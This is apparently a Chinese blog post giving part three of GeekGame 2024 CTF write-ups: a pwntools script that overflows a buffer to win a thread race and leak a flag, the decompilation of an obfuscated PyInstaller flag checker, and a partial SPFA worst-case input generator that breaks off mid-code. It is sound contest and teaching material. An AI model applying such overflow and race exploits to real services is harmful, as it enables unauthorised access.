---
title: GeekGame 2024 题解 (三)
disableNunjucks: false
mathjax: true
id: 12067
date: 2024-10-19 19:15:50
categories: 
  - CTF题解
tags:
  - GeekGame
  - GeekGame 2024
cover: https://blogfiles.oss.fyz666.xyz/png/48f1d9cd-cd8c-4abd-ba92-7390d9ec1b32.png
---

本文是GeekGame 2024题解的第三部分。

## Fast Or Clever

{% hideToggle 查看题面 %}
{% note primary simple %}

本挑战中，你不仅是个黑客，更是个赛车手。

你将展现杰出的控制能力，去控制赛场的设定。你将发挥挑战的精神，改变看似必然的失败。你**在线程交替中抢夺时间，**更快到达 Flag 所在的终点。

> So, are you fast enough… or clever enough… for this challenge?

[本题附件](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/binary-racecar/attachment/binary-racecar.zip)

{% endnote %}

{% endhideToggle %}

题目已经说的很清楚了，要通过**在线程交替中抢夺时间**，来拿到flag。

拿到文件，用ida64打开：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+4h] [rbp-1Ch]
  pthread_t newthread; // [rsp+8h] [rbp-18h] BYREF
  pthread_t th[2]; // [rsp+10h] [rbp-10h] BYREF

  th[1] = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts(
    "for racecar drivers, there are two things to hope for: one is that you drive fast enough, and the other is that the "
    "opponent is slow enough.");
  puts("Brave and clever contestant,  win the race to get the flag!");
  fd = open("/flag", 0);
  read(fd, flag_buf, 0x30uLL);
  printf("please enter the size to output your flag: ");
  __isoc99_scanf("%d", &size);
  puts("please enter the content to read to buffer (max 0x100 bytes): ");
  read(0, &p, 0x104uLL);
  sleep(1u);
  pthread_create(&newthread, 0LL, do_output, 0LL);
  pthread_create(th, 0LL, get_thread2_input, &p);
  pthread_join(newthread, 0LL);
  pthread_join(th[0], 0LL);
  return 0;
}
```

发现程序先后创建了两个线程，第一个线程函数：

```c
void *__fastcall do_output(void *a1)
{
  void *result; // rax

  if ( size <= 4 )
  {
    if ( size > 0 )
    {
      if ( (int)strlen(flag_buf) <= 48 )
      {
        usleep(usleep_time);
        puts("copying the flag...");
        memcpy(output_buf, flag_buf, size);
        puts(output_buf);
      }
      else
      {
        puts("what happened?");
      }
      result = 0LL;
    }
    else
    {
      puts("invalid output size!!");
      result = 0LL;
    }
  }
  else
  {
    puts("output size is too large");
    result = 0LL;
  }
  return result;
}
```

发现当前面main函数里输入的`size`变量不大于4时，可以输出flag的前`size`个字符。那岂不是没什么用？

来看第二个线程函数：

```c
void *__fastcall get_thread2_input(void *a1)
{
  puts("please enter the size to read to the buffer:");
  __isoc99_scanf("%d", &size);
  if ( size <= 49 )
  {
    memcpy(&buf, a1, size);
    puts("input success!\n");
  }
  else
  {
    puts("the size read to the buffer is too large");
  }
  return 0LL;
}
```

发现这个线程里，我们可以修改前面的全局变量`size`。所以思路就是先让第一个线程通过` if ( size <= 4 )`这条判断，然后趁它`usleep(usleep_time);`的时候，进入第二个线程把`size`改了，就能拿到flag。

但难道这题就那么简单吗？我试了一下发现直接去`get_thread2_input`改`size`并不能成功，后来用gdb调试了一下，发现`usleep_time`的值是0。

怪不得！

然后看能不能想办法把`usleep_time`覆盖了，观察了一下栈结构，发现变量`p`的地址是0x8060，而`usleep_time`的地址是0x8160，`p`位于低地址，且地址相差0x100，而我们可以往`p`写入的字节数是：`read(0, &p, 0x104uLL);` 0x104，大于两者的地址差值，于是可以通过栈溢出去覆盖`usleep_time`。这样一来，就很容易写出payload了，exp如下：

```python
from pwn import *

token = 'TOKEN'

offset_to_usleep_time = 0x100
new_usleep_time = 1000000
payload = b'A' * offset_to_usleep_time
payload += p32(new_usleep_time)

r = remote('prob11.geekgame.pku.edu.cn', 10011)
r.sendlineafter(b'Please input your token: ', token.encode())
r.sendlineafter(b'please enter the size to output your flag: ', b'4').decode()
r.sendlineafter(b'please enter the content to read to buffer (max 0x100 bytes): ', payload).decode()
r.sendlineafter(b'please enter the size to read to the buffer:', b'49').decode()
print(r.recvall().decode())
```

这道题是我在正式比赛中成功利用栈溢出解出的第一个逆向题，是一个比较大的突破！（虽然真的很简单）

## 从零开始学Python

{% hideToggle 查看题面 %}
{% note primary simple %}

> 杰弗里·辛顿 (Geoffrey Hinton)，在 2018 年因其在深度学习方面的贡献，获得了图灵奖这一计算机领域内的最富盛名的奖项。 2024 年他获得了诺贝尔物理学奖，以表彰在使用人工神经网络实现机器学习方面奠基性发现和发明。 他表示自己完全没有想到这样的事情会发生。
>
> 荒诞的世界变得更加荒诞，也许未来某一天，计算机科学也将不复存在！

2991 年，距离 Python 发布已经过去了 1000 年。

小 Y 在一台历史悠久的电脑上找到了一个尘封已久的程序，好像是个特殊的校验器。 程序在几百年后的电脑上已经无法运行，但是电脑上遗留的一些实验日志记录了一些蛛丝马迹。

*众所周知，Python 的 `random` 库可以生成伪随机数。*

曾经的一个科学家写下了这一份代码，尝试从随机的混乱中找到一丝秩序。 但是有**神秘力量**稳定了混乱的随机数，让程序失去了随机性，实验获得了一个稳定且非常好的结果。

请尝试通过这份程序复现实验：

- 源码中遗留的隐藏信息 —— Flag 1
- 影响随机数的神秘力量 —— Flag 2
- 科学家获得的实验结果 —— Flag 3

**注意**：请关注程序运行的每一步，不经意的遗漏都可能导致你功亏一篑。

[本题附件](https://github.com/PKU-GeekGame/geekgame-4th/raw/refs/heads/master/official_writeup/binary-pymaster/attachment/binary-pymaster.zip)

{% endnote %}

{% endhideToggle %}

既然是用Python打包的可执行文件，那就用[Pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)这个工具来反编译一下（这里得去Linux系统下反编译，不然似乎拿不到`PYZ-00.pyz_extracted`这个目录下的文件，没法做后面两个flag）

### 源码中遗留的隐藏信息

从反编译的结果中找到一个pymaster.pyc，再用[decompyle3](https://github.com/rocky/python-decompile3/)反编译拿到文件内容：

```python
# decompyle3 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.9.15 (main, Nov  4 2022, 16:35:55) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: pymaster.py
import marshal, random, base64
if random.randint(0, 65535) == 54830:
    exec(marshal.loads(base64.b64decode(b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMwAAAAZABaAGUBZAGDAWUCZQNkAoMBZAODAmUCZQNkBIMBZAWDAmUAgwGDAYMBAQBkBlMAKQdztAQAAGVKekZWMTFQMnpBVWZhL1UvMkN5bDBSanlCV3NiR2g3R0N2ZFlCMHBHNkFGeEt5MGRkdWdORUg1Z0VRVC8zMTIzQ1NPN1RSdDBiUlVhdFBjYzI5OGo0K3ZyNTNGZ3g5RUlMQzlpYjlvdHh6MmQyU0h1SHZRYnJWYnI4RFV0V2NkOEJGbzlPWlA2c2ZvVTdDUG9xOG42THY5OHhJSHlPeWpvWFU0aDk2elJqM2FyYkZyaHlHd0oyZGZnc3RmcG5WKzFHNEJjazN3RkNEa2VFNkVrRjVZaDd2QUpGZjJEWTBsbEY0bFlvOEN5QWpvVDUwZE1qdXNzVVBxZis1N1dHMkhacE1kRm5aRmhxUFZHZFprZFVvdUxtb2VvSXhhSWFtNDkvbHdUM1BIeFp5TnBickRvbkk0ZWpsVEViZ2tSb21XUENoTzhpZkVLZnlFUkl0YlR4Y0NHTEl2ZGtQVlVPcENYamVFeEM1SlFwZmpOZWVsOFBFbUV0VXFaM1VFUTVIVldpVFZNYlVOdzF2VEFWOU1COXlPRG1tQ042SGpuNm5qNVhSc3FZNm1qT3I4bW9XaFhIYmJydUoxaDY0b2U5ZVZzcGZ3eEtTa1hDWUMvVWxlblZPQlZUS3o3RkZOT1dUR2ZHOUl1TGNVejdLYlNzUmtWY21VYTN0YUFqS3BKZFF6cWEyZG5FVjBsbWFueE1JcU5zMzlrd3BKTEtWVVNibTNCdVdtUUxtWlV3NWx5dUVxeXVGL3BSeXVTK05LeWswRjVYQWp5cE5OT2lCU2hiaDJTdWZRQ25ETWd4a3RKVXJaQ1FsTlJGd3plMHZmRWllMUYxbWY5b0ZEWkozYnFySlNHV3lzcUl0TmRVa09vR29CODNJTUpIVnRwSzB5bmlDeVplTExBaStsek10R0hVTktrbGVseWtWVllMbUcwVGRZbzFyUjNBVnZYNzR2SlBGSG1zYitWUHM5V1FVaGVFM1FhWVJEL2JiQ0xSbm03K1VaWW8vK09GNmt3MTBBazM3ZnVET0VBTXJ4WlBTc2pjeUZIK0FvRGp3UUtwSk5TNWY3UEZtMWF1NjVOU0t0anpYV3hvcDFRUWlWV2VrWVZIQmlJVnB2U1NpVTByd1V1RXc1clJRN3NFQmNUNWZvdXVjamovUmkzeTZlelFuQThSN2lTTmVHTGlhSFI0QzlDQWNnbXVQcy9IZ0V0TUtKY09KaWJzZVpHNVRUL1M2WDFrTkFxZEl1Z3hUWU05dnhkalJPR1d6T1pjSE9iNC9lM3RGUTdLQ3FBVC9nalc4NnpQaXNiZm9pOW1US2h4dVFiTG5ncXByTmNaM29uQWo4aFc3c2tyRk5TZ1lHaHNHL0JkSGdCRHJET2t3NlVMMGxWT1F0elljRDFJdUhTZDBRMEZlMEJtUW4vcjFSOTJDQ3gvNEU2OXJoeWRqOVlRMVB6YkQzT0lpdGI3M2hZSGpqd0xQUndEcCtQN3J3MzMyKzZibjl4NmRqQ3g2T3crNXBUaDAvSjA2bEE3NlNtYmY4R016OHFCREtmakVEZ3RLVk0wVS9EajF5ZS9ZQ0kwUmZwaUcwSUdhRU5GSEVQYXJidjV1T0tGVT3aBGV4ZWPaBHpsaWLaCmRlY29tcHJlc3PaBmJhc2U2NNoJYjY0ZGVjb2RlTikE2gRjb2Rl2gRldmFs2gdnZXRhdHRy2gpfX2ltcG9ydF9fqQByCQAAAHIJAAAA2gDaCDxtb2R1bGU+AQAAAHMKAAAABAEGAQwBEP8C/w==')))

# okay decompiling pymaster.pyc

```

咦，为什么明明只有1/65536的概率才能运行，但实际每次都能运行的起来？当时我并没有深究原因，而是继续解码下去，这里先写个脚本把marshal load出来的代码导出成一个pyc文件：

```python
import importlib, sys
code = marshal.loads(base64.b64decode(b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMwAAAAZABaAGUBZAGDAWUCZQNkAoMBZAODAmUCZQNkBIMBZAWDAmUAgwGDAYMBAQBkBlMAKQdztAQAAGVKekZWMTFQMnpBVWZhL1UvMkN5bDBSanlCV3NiR2g3R0N2ZFlCMHBHNkFGeEt5MGRkdWdORUg1Z0VRVC8zMTIzQ1NPN1RSdDBiUlVhdFBjYzI5OGo0K3ZyNTNGZ3g5RUlMQzlpYjlvdHh6MmQyU0h1SHZRYnJWYnI4RFV0V2NkOEJGbzlPWlA2c2ZvVTdDUG9xOG42THY5OHhJSHlPeWpvWFU0aDk2elJqM2FyYkZyaHlHd0oyZGZnc3RmcG5WKzFHNEJjazN3RkNEa2VFNkVrRjVZaDd2QUpGZjJEWTBsbEY0bFlvOEN5QWpvVDUwZE1qdXNzVVBxZis1N1dHMkhacE1kRm5aRmhxUFZHZFprZFVvdUxtb2VvSXhhSWFtNDkvbHdUM1BIeFp5TnBickRvbkk0ZWpsVEViZ2tSb21XUENoTzhpZkVLZnlFUkl0YlR4Y0NHTEl2ZGtQVlVPcENYamVFeEM1SlFwZmpOZWVsOFBFbUV0VXFaM1VFUTVIVldpVFZNYlVOdzF2VEFWOU1COXlPRG1tQ042SGpuNm5qNVhSc3FZNm1qT3I4bW9XaFhIYmJydUoxaDY0b2U5ZVZzcGZ3eEtTa1hDWUMvVWxlblZPQlZUS3o3RkZOT1dUR2ZHOUl1TGNVejdLYlNzUmtWY21VYTN0YUFqS3BKZFF6cWEyZG5FVjBsbWFueE1JcU5zMzlrd3BKTEtWVVNibTNCdVdtUUxtWlV3NWx5dUVxeXVGL3BSeXVTK05LeWswRjVYQWp5cE5OT2lCU2hiaDJTdWZRQ25ETWd4a3RKVXJaQ1FsTlJGd3plMHZmRWllMUYxbWY5b0ZEWkozYnFySlNHV3lzcUl0TmRVa09vR29CODNJTUpIVnRwSzB5bmlDeVplTExBaStsek10R0hVTktrbGVseWtWVllMbUcwVGRZbzFyUjNBVnZYNzR2SlBGSG1zYitWUHM5V1FVaGVFM1FhWVJEL2JiQ0xSbm03K1VaWW8vK09GNmt3MTBBazM3ZnVET0VBTXJ4WlBTc2pjeUZIK0FvRGp3UUtwSk5TNWY3UEZtMWF1NjVOU0t0anpYV3hvcDFRUWlWV2VrWVZIQmlJVnB2U1NpVTByd1V1RXc1clJRN3NFQmNUNWZvdXVjamovUmkzeTZlelFuQThSN2lTTmVHTGlhSFI0QzlDQWNnbXVQcy9IZ0V0TUtKY09KaWJzZVpHNVRUL1M2WDFrTkFxZEl1Z3hUWU05dnhkalJPR1d6T1pjSE9iNC9lM3RGUTdLQ3FBVC9nalc4NnpQaXNiZm9pOW1US2h4dVFiTG5ncXByTmNaM29uQWo4aFc3c2tyRk5TZ1lHaHNHL0JkSGdCRHJET2t3NlVMMGxWT1F0elljRDFJdUhTZDBRMEZlMEJtUW4vcjFSOTJDQ3gvNEU2OXJoeWRqOVlRMVB6YkQzT0lpdGI3M2hZSGpqd0xQUndEcCtQN3J3MzMyKzZibjl4NmRqQ3g2T3crNXBUaDAvSjA2bEE3NlNtYmY4R016OHFCREtmakVEZ3RLVk0wVS9EajF5ZS9ZQ0kwUmZwaUcwSUdhRU5GSEVQYXJidjV1T0tGVT3aBGV4ZWPaBHpsaWLaCmRlY29tcHJlc3PaBmJhc2U2NNoJYjY0ZGVjb2RlTikE2gRjb2Rl2gRldmFs2gdnZXRhdHRy2gpfX2ltcG9ydF9fqQByCQAAAHIJAAAA2gDaCDxtb2R1bGU+AQAAAHMKAAAABAEGAQwBEP8C/w=='))
pyc_data = importlib._bootstrap_external._code_to_timestamp_pyc(code)
print(pyc_data)
with open('file.pyc', 'wb') as f:
    f.write(pyc_data)
```

然而这个pyc，我用decompyle3反编译失败了，但我又找了个[在线网站](https://pylingual.io/)来反编译它，得到：

```python
code = b'eJzFV11P2zAUfa/U/2Cyl0RjyBWsbGh7GCvdYB0pG6AFxKy0ddugNEH5gEQT/3123CSO7TRt0bRUatPcc298j4+vr53Fgx9EILC9ib9otxz2d2SHuHvQbrVbr8DUtWcd8BFo9OZP6sfoU7CPoq8n6Lv98xIHyOyjoXU4h96zRj3arbFrhyGwJ2dfgstfpnV+1G4Bck3wFCDkeE6EkF5Yh7vAJFf2DY0llF4lYo8CyAjoT50dMjussUPqf+57WG2HZpMdFnZFhqPVGdZkdUouLmoeoIxaIam49/lwT3PHxZyNpbrDonI4ejlTEbgkRomWPChO8ifEKfyERItbTxcCGLIvdkPVUOpCXjeExC5JQpfjNeel8PEmEtUqZ3UEQ5HVWiTVMbUNw1vTAV9MB9yODmmCN6Hjn6nj5XRsqY6mjOr8moWhXHbbruJ1h64oe9eVspfwxKSkXCYC/UlenVOBVTKz7FFNOWTGfG9IuLcUz7KbSsRkVcmUa3taAjKpJdQzqa2dnEV0lmanxMIqNs39kwpJLKVUSbm3BuWmQLmZUw5lyuEqyuF/pRyuS+NKyk0F5XAjypNNOiBShbh2SufQCnDMgxktJUrZCQlNRFwze0vfEie1F1mf9oFDZJ3bqrJSGWysqItNdUkOoGoB83IMJHVtpK0yniCyZeLLAi+lzMtGHUNKklelykVVYLmG0TdYo1rR3AVvX74vJPFHmsb+VPs9WQUheE3QaYRD/bbCLRnm7+UZYo/+OF6kw10Ak37fuDOEAMrxZPSsjcyFH+AoDjwQKpJNS5f7PFm1au65NSKtjzXWxop1QQiVWekYVHBiIVpvSSiU0rwUuEw5rRQ7sEBcT5fouucjj/Ri3y6ezQnA8R7iSNeGLiaHR4C9CAcgmuPs/HgEtMKJcOJibseZG5TT/S6X1kNAqdIugxTYM9vxdjROGWzOZcHOb4/e3tFQ7KCqAT/gjW86zPisbfoi9mTKhxuQbLngqprNcZ3onAj8hW7skrFNSgYGhsG/BdHgBDrDOkw6UL0lVOQtzYcD1IuHSd0Q0Fe0BmQn/r1R92CCx/4E69rhydj9YQ1PzbD3OIitb73hYHjjwLPRwDp+P7rw332+6bn9x6djCx6Ow+5pTh0/J06lA76Smbf8GMz8qBDKfjEDgtKVM0U/Dj1ye/YCI0RfpiG0IGaENFHEParbv5uOKFU='
eval('exec')(getattr(__import__('zlib'), 'decompress')(getattr(__import__('base64'), 'b64decode')(code)))
```

把这段base64解码成人话，得到：

```python
import random
import base64
# flag1 = "flag{you_Ar3_tHE_MaSTer_OF_PY7h0n}"
class adJGrTXOYN:
    def __init__(adJGrTXOYP, OOOO, OOO0):
        adJGrTXOYP.OOOO = OOOO
        adJGrTXOYP.OOO0 = OOO0
        adJGrTXOYP.OO0O = None
        adJGrTXOYP.O0OO = None
        adJGrTXOYP.O0O0 = None
class adJGrTXOYb:
    def __init__(adJGrTXOYP):
        adJGrTXOYP.IIII = None
    def adJGrTXOYb(adJGrTXOYP, adJGrTXOYo):
        while adJGrTXOYo.OO0O != None:
            if adJGrTXOYo.OO0O.OO0O == None:
                if adJGrTXOYo == adJGrTXOYo.OO0O.O0OO:
                    adJGrTXOYP.adJGrTXOYn(adJGrTXOYo.OO0O)
                else:
                    adJGrTXOYP.adJGrTXOYV(adJGrTXOYo.OO0O)
            elif (
                adJGrTXOYo == adJGrTXOYo.OO0O.O0OO
                and adJGrTXOYo.OO0O == adJGrTXOYo.OO0O.OO0O.O0OO
            ):
                adJGrTXOYP.adJGrTXOYn(adJGrTXOYo.OO0O.OO0O)
                adJGrTXOYP.adJGrTXOYn(adJGrTXOYo.OO0O)
            elif (
                adJGrTXOYo == adJGrTXOYo.OO0O.O0O0
                and adJGrTXOYo.OO0O == adJGrTXOYo.OO0O.OO0O.O0O0
            ):
                adJGrTXOYP.adJGrTXOYV(adJGrTXOYo.OO0O.OO0O)
                adJGrTXOYP.adJGrTXOYV(adJGrTXOYo.OO0O)
            elif (
                adJGrTXOYo == adJGrTXOYo.OO0O.O0O0
                and adJGrTXOYo.OO0O == adJGrTXOYo.OO0O.OO0O.O0OO
            ):
                adJGrTXOYP.adJGrTXOYV(adJGrTXOYo.OO0O)
                adJGrTXOYP.adJGrTXOYn(adJGrTXOYo.OO0O)
            else:
                adJGrTXOYP.adJGrTXOYn(adJGrTXOYo.OO0O)
                adJGrTXOYP.adJGrTXOYV(adJGrTXOYo.OO0O)
    def adJGrTXOYV(adJGrTXOYP, x):
        y = x.O0O0
        x.O0O0 = y.O0OO
        if y.O0OO != None:
            y.O0OO.OO0O = x
        y.OO0O = x.OO0O
        if x.OO0O == None:
            adJGrTXOYP.IIII = y
        elif x == x.OO0O.O0OO:
            x.OO0O.O0OO = y
        else:
            x.OO0O.O0O0 = y
        y.O0OO = x
        x.OO0O = y
    def adJGrTXOYn(adJGrTXOYP, x):
        y = x.O0OO
        x.O0OO = y.O0O0
        if y.O0O0 != None:
            y.O0O0.OO0O = x
        y.OO0O = x.OO0O
        if x.OO0O == None:
            adJGrTXOYP.IIII = y
        elif x == x.OO0O.O0O0:
            x.OO0O.O0O0 = y
        else:
            x.OO0O.O0OO = y
        y.O0O0 = x
        x.OO0O = y
    def adJGrTXOYx(adJGrTXOYP, OOOO, OOO0):
        adJGrTXOYo = adJGrTXOYN(OOOO, OOO0)
        adJGrTXOYu = adJGrTXOYP.IIII
        OO0O = None
        while adJGrTXOYu != None:
            OO0O = adJGrTXOYu
            if OOOO < adJGrTXOYu.OOOO:
                adJGrTXOYu = adJGrTXOYu.O0OO
            else:
                adJGrTXOYu = adJGrTXOYu.O0O0
        adJGrTXOYo.OO0O = OO0O
        if OO0O == None:
            adJGrTXOYP.IIII = adJGrTXOYo
        elif OOOO < OO0O.OOOO:
            OO0O.O0OO = adJGrTXOYo
        else:
            OO0O.O0O0 = adJGrTXOYo
        adJGrTXOYP.adJGrTXOYb(adJGrTXOYo)
def adJGrTXOYQ(adJGrTXOYo):
    s = b""
    if adJGrTXOYo != None:
        s += bytes([adJGrTXOYo.OOO0 ^ random.randint(0, 0xFF)])
        s += adJGrTXOYQ(adJGrTXOYo.O0OO)
        s += adJGrTXOYQ(adJGrTXOYo.O0O0)
    return s
def adJGrTXOYy(adJGrTXOYj):
    adJGrTXOYu = adJGrTXOYj.IIII
    OO0O = None
    while adJGrTXOYu != None:
        OO0O = adJGrTXOYu
        if random.randint(0, 1) == 0:
            adJGrTXOYu = adJGrTXOYu.O0OO
        else:
            adJGrTXOYu = adJGrTXOYu.O0O0
    adJGrTXOYj.adJGrTXOYb(OO0O)
def adJGrTXOYD():
    adJGrTXOYj = adJGrTXOYb()
    adJGrTXOYh = input("Please enter the flag: ")
    if len(adJGrTXOYh) != 36:
        print("Try again!")
        return
    if adJGrTXOYh[:5] != "flag{" or adJGrTXOYh[-1] != "}":
        print("Try again!")
        return
    for adJGrTXOYL in adJGrTXOYh:
        adJGrTXOYj.adJGrTXOYx(random.random(), ord(adJGrTXOYL))
    for _ in range(0x100):
        adJGrTXOYy(adJGrTXOYj)
    adJGrTXOYi = adJGrTXOYQ(adJGrTXOYj.IIII)
    adJGrTXOYU = base64.b64decode("7EclRYPIOsDvLuYKDPLPZi0JbLYB9bQo8CZDlFvwBY07cs6I")
    if adJGrTXOYi == adJGrTXOYU:
        print("You got the flag3!")
    else:
        print("Try again!")
if __name__ == "__main__":
    adJGrTXOYD()
```

这就得到了flag1。

### 影响随机数的神秘力量

这题想了很久，一开始想着既然flag1都在最后解出来那个文件里了，那么后面两个flag应该也是围绕这个文件来解。

我先把上面的代码pretty了一下：

```python
import random
import base64
# flag1 = "flag{you_Ar3_tHE_MaSTer_OF_PY7h0n}"
class TreeNode:
    def __init__(self, key, value):
        self.key = key
        self.value = value
        self.parent = None
        self.left = None
        self.right = None


class BinaryTree:
    def __init__(self):
        self.root = None

    def balance_tree(self, node):
        while node.parent is not None:
            if node.parent.parent is None:
                if node == node.parent.left:
                    self.rotate_right(node.parent)
                else:
                    self.rotate_left(node.parent)
            elif (
                    node == node.parent.left
                    and node.parent == node.parent.parent.left
            ):
                self.rotate_right(node.parent.parent)
                self.rotate_right(node.parent)
            elif (
                    node == node.parent.right
                    and node.parent == node.parent.parent.right
            ):
                self.rotate_left(node.parent.parent)
                self.rotate_left(node.parent)
            elif (
                    node == node.parent.right
                    and node.parent == node.parent.parent.left
            ):
                self.rotate_left(node.parent)
                self.rotate_right(node.parent)
            else:
                self.rotate_right(node.parent)
                self.rotate_left(node.parent)

    def rotate_left(self, node):
        right_child = node.right
        node.right = right_child.left
        if right_child.left is not None:
            right_child.left.parent = node
        right_child.parent = node.parent
        if node.parent is None:
            self.root = right_child
        elif node == node.parent.left:
            node.parent.left = right_child
        else:
            node.parent.right = right_child
        right_child.left = node
        node.parent = right_child

    def rotate_right(self, node):
        left_child = node.left
        node.left = left_child.right
        if left_child.right is not None:
            left_child.right.parent = node
        left_child.parent = node.parent
        if node.parent is None:
            self.root = left_child
        elif node == node.parent.right:
            node.parent.right = left_child
        else:
            node.parent.left = left_child
        left_child.right = node
        node.parent = left_child

    def insert(self, key, value):
        new_node = TreeNode(key, value)
        current_node = self.root
        parent_node = None
        while current_node is not None:
            parent_node = current_node
            if key < current_node.key:
                current_node = current_node.left
            else:
                current_node = current_node.right
        new_node.parent = parent_node
        if parent_node is None:
            self.root = new_node
        elif key < parent_node.key:
            parent_node.left = new_node
        else:
            parent_node.right = new_node
        self.balance_tree(new_node)


def traverse_and_encode(node):
    result = b""
    if node is not None:
        result += bytes([node.value ^ random.randint(0, 0xFF)])
        result += traverse_and_encode(node.left)
        result += traverse_and_encode(node.right)
    return result


def random_tree_balance(binary_tree):
    current_node = binary_tree.root
    random_node = None
    while current_node is not None:
        random_node = current_node
        if random.randint(0, 1) == 0:
            current_node = current_node.left
        else:
            current_node = current_node.right
    binary_tree.balance_tree(random_node)

def main():
    tree = BinaryTree()
    flag = input("Please enter the flag: ")
    if len(flag) != 36:
        print("Try again!")
        return
    if flag[:5] != "flag{" or flag[-1] != "}":
        print("Try again!")
        return
    for c in flag:
        tree.insert(random.random(), ord(c))
    for _ in range(0x100):
        random_tree_balance(tree)
    x = traverse_and_encode(tree.root)
    y = base64.b64decode("7EclRYPIOsDvLuYKDPLPZi0JbLYB9bQo8CZDlFvwBY07cs6I")
    if x == y:
        print("You got the flag3!")
    else:
        print("Try again!")
```

发现是一个二叉树然后各种随机插入节点然后旋转什么的，然而我发现最后形成的树的结构是完全随机的，遍历节点时与节点的value进行异或运算的值也是完全随机的，并且都与我输入的flag毫无关系，这我要如何控制输出的结果恰好就是那一串东西？于是我卡了很久没做这题。

后来我又开始思考为什么程序每次都能运行起来这件事，我想到可能一开始反编译出来的`random.pyc`文件里可能有点东西，于是把它拖进了前面那个[网页](https://pylingual.io/)，搜索flag发现：

<img src="https://blogfiles.oss.fyz666.xyz/png/7a47c4a5-08cd-4b23-8612-12b8aa8ff5d4.png" alt="image-20241019190347966" style="zoom:50%;" />

原来竟是如此！没想到这flag2居然比flag1藏的浅。

### 科学家获得的实验结果

既然有了随机种子，那后面所有的随机数都是确定的了，从而形成的二叉树结构、异或的值也都是确定的数，我们都不需要去研究这个树的插入、旋转都在干些什么事了，拿flag3也不废催飞滋力。

第一步先确定最后生成的树的结构，我们随便输入一个flag：

```raw
flag{1234567890!@#$%^&*():[];uvwxyz}
```

把下面函数里的异或去掉：

```python
def traverse_and_encode(node):
    result = b""
    if node is not None:
        result += bytes([node.value])
        result += traverse_and_encode(node.left)
        result += traverse_and_encode(node.right)
    return result
```

根据得到的`result`，就确定了树的形状。

接下来只要存下每次异或的数，从最后的结果反推回去就行。

[解题代码](https://gist.github.com/windshadow233/4e976daf34897436fbb34edcd2bd6fac)

## 打破复杂度

{% hideToggle 查看题面 %}
{% note primary simple %}

> 众所周知，复杂度的计算是复杂的。

小 Y 最近在学习图论，老师教了他如何计算图论算法的复杂度。

但是他发现平时使用这些算法的时候，情况有所不同，它们大多都运行得非常快，时常优于其理论复杂度。

于是，长久以来，他变得相信可以“一招鲜，吃遍天”，直到有一天……

![algo-complexity-death_of_spfa](https://blogfiles.oss.fyz666.xyz/webp/33fd0858-7836-44bf-8b23-ac90e5311c77.webp)

<center>↑ 此图在二压后码率减小了 85%，插图清晰度变糊不是你的错觉</center>

和毒瘤出题人签订契约，**卡掉 SPFA 和 Dinic 算法**吧。

**补充说明：**

- 请上传符合代码要求的输入格式的原始输入文件，不需要打包成压缩包。输入长度限制为 200KB。
- 如果提示 “Internal System Error” 或 “Runtime Error” 可能是因为程序的 assert 没有通过，请检查输入格式；如果提示 “Time Limit Exceeded” 可能是因为输入不完整（例如输入末尾缺少回车），导致程序卡在 `cin`。

{% endnote %}

{% endhideToggle %}

作为一个从没打过ACM比赛的菜狗，我甚至都没听说过这两个算法。~~不过现在听说过了~~

### 关于SPFA—它死了

{% note primary simple %}

最短路径快速算法 (Shortest Path Faster Algorithm, SPFA)，一般也被称为带有队列优化的 Bellman-Ford 算法。

相较于 Bellman-Ford 算法，SPFA 的最坏复杂度和其一致为O(|V||E|)

但是在实际使用中，在很多情况下，SPFA 的速度远优于其最坏复杂度。

请尝试让 SPFA 达到其理论最坏复杂度 (使代码中的计数器超过 2e6)。

{% endnote %}

{% hideToggle SPFA Algorithm %}

```cpp
// SPFA algorithm

#include <assert.h>
#include <iostream>

#include <list>
#include <queue>
#include <vector>

using namespace std;

const int MAXN = 2000;
const int MAXM = 8000;
const int MAXW = 1e9;

struct edge {
    int to, cost;
};
list<edge> E[MAXN + 1];
long long ops = 0;

void spfa(int n, int m, int start, int end) {
    vector<int> dist(n + 1, MAXW + 1);
    vector<bool> vis(n + 1, false);
    queue<int> q;

    dist[start] = 0;
    vis[start] = true;
    q.push(start);
    while (!q.empty()) {
        int u = q.front();
        q.pop();
        vis[u] = false;
        for (edge e : E[u]) {
            int v = e.to, w = e.cost;
            ops++;
            if (dist[v] > dist[u] + w) {
                dist[v] = dist[u] + w;
                if (!vis[v]) {
                    vis[v] = true;
                    q.push(v);
                }
            }
        }
    }
    cout << dist[end] << endl;
}

int main(int argc, char *argv[]) {
    int n, m, s, t;
    cin >> n >> m >> s >> t;
    assert(1 <= n && n <= MAXN);
    assert(1 <= m && m <= MAXM);

    long long sum = 0;
    for (int i = 0; i < m; i++) {
        int u, v, w;
        cin >> u >> v >> w;
        sum += w;
        assert(1 <= u && u <= n);
        assert(1 <= v && v <= n);
        assert(1 <= w && w <= MAXW);
        assert(1 <= sum && sum <= MAXW);
        assert(u != v);

        E[u].push_back({v, w});
        E[v].push_back({u, w});
    }

    spfa(n, m, s, t);

    cerr << ops << endl;
}
```

{% endhideToggle %}

「如何卡掉SPFA」在国内各种算法相关的论坛上讨论挺多的，不过这题有所限制：不能有负权边、不能有自环，我直接搜到一篇：[「笔记」如何优雅地卡 Spfa](https://www.cnblogs.com/luckyblock/p/14317096.html)。把文中提供的构造数据的代码改成了Python版本：

```python
# https://www.cnblogs.com/luckyblock/p/14317096.html
import random
import time


class Edge:
    def __init__(self, u, v, w):
        self.u = u
        self.v = v
        self.w = w


def main():
    n = 3  # number of rows
    m = 2000 // n  # number of columns
    ids = [[0 for _ in range(m + 1)] for _ in range(n + 1)]  # matrix to hold node IDs
    a = [0] * 1000000  # large array to hold node mappings
    v = []  # list to store all edges
    tp = 0  # counter for total nodes
    SIZE = 29989  # max random size for edge weights

    random.seed(time.time())

    for i in range(1, n + 1):
        for j in range(1, m + 1):
            tp += 1
            ids[i][j] = tp
            a[tp] = tp

    for i in range(1, n + 1):
        for j in range(1, m + 1):
            if i < n:
                v.append(Edge(ids[i][j], ids[i + 1][j], 1))
                v.append(Edge(ids[i + 1][j], ids[i][j], 1))
                if j < m:
